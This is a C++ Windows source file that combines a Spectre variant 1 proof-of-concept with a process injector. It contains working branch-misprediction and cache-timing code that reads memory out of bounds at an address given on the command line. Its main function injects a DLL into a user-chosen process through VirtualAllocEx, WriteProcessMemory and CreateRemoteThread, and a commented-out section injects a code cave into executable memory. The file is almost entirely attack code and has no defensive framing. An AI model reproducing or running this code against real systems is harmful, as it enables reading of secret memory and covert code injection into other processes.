// attack_spectre.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <intrin.h>
#include <iostream>
#include <Windows.h>

#pragma optimize("gt", on)



//
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

//char* secret = "My password is abcdefg123456.";
char* secret = "M";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}


//Analysis code
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			  /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			  /* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

void attack(int argc, const char* * argv)
{
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

	printf("put secret to address %p\n", secret);
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}

	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
			(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
			(value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				score[1]);
		printf("\n");
	}
}

void attack1()
{
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

	//printf("put secret to address %p\n", secret);
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */


//	while (--len >= 0)
//	{
//		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
//		readMemoryByte(malicious_x++, value, score);
//		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
//		printf("0x%02X='%c' score=%d ", value[0],
//			(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
//		if (score[1] > 0)
//			printf("(second best: 0x%02X='%c' score=%d)", value[1],
//			(value[1] > 31 && value[1] < 127 ? value[1] : '?'),
//				score[1]);
//		printf("\n");
//	}
}

struct cavedata
{
	int argc;
	const char** argv;
};

DWORD __stdcall RemoteThread(cavedata *cData)
{
	if (cData)
	{
		//attack(cData->argc, cData->argv);
		attack1();
	}
	

	return EXIT_SUCCESS;
}



int main(int argc, const char* * argv)
{
	LPCSTR DllPath = "C:\\Users\\rs\\Desktop\\spectre.dll";

	int pid;
	std::cout << "please input the process id you want to inject " << std::endl;
	std::cin >> pid;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		LPSTR messageBuffer = nullptr;
		size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPSTR)&messageBuffer,
			0,
			NULL);

		std::string message(messageBuffer, size);
		std::cout << message.c_str() << std::endl;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

	HANDLE hLoadThread = CreateRemoteThread(hProcess,
		0,
		0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
		pDllPath,
		0,
		0);

	WaitForSingleObject(hLoadThread, INFINITE);

	std::cout << "Dll path allocated at: " << pDllPath << std::endl;
	std::cin.get();

	VirtualFreeEx(hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);
	return 0;
//	//attack(argc, argv);
//	attack1();
//
//	cavedata CaveData;
//	ZeroMemory(&CaveData, sizeof(cavedata));
//	CaveData.argc = argc;
//	CaveData.argv = argv;
//
//	int pid;
//	std::cout << "please input the process id you want to inject " << std::endl;
//	std::cin >> pid;
//
//	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//	if (hProcess == NULL)
//	{
//		std::cout << "Open process error %d " << GetLastError() << std::endl;
//		return -1;
//	}
//		
//	LPVOID pRemoteThread = VirtualAllocEx(hProcess, NULL, sizeof(cavedata), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//	WriteProcessMemory(hProcess, pRemoteThread, (LPVOID)RemoteThread, sizeof(cavedata), 0);
//
//
//	cavedata *pData = (cavedata*)VirtualAllocEx(hProcess, NULL, sizeof(cavedata), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	WriteProcessMemory(hProcess, pData, &CaveData, sizeof(cavedata), NULL);
//
//
//	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, pData, 0, 0);
//	WaitForSingleObject(hThread, INFINITE);
//
//	VirtualFreeEx(hProcess, pRemoteThread, sizeof(cavedata), MEM_RELEASE);
//	VirtualFreeEx(hProcess, pData, sizeof(cavedata), MEM_RELEASE);
//	CloseHandle(hProcess);
//
//	getchar();
//	return 0;
}
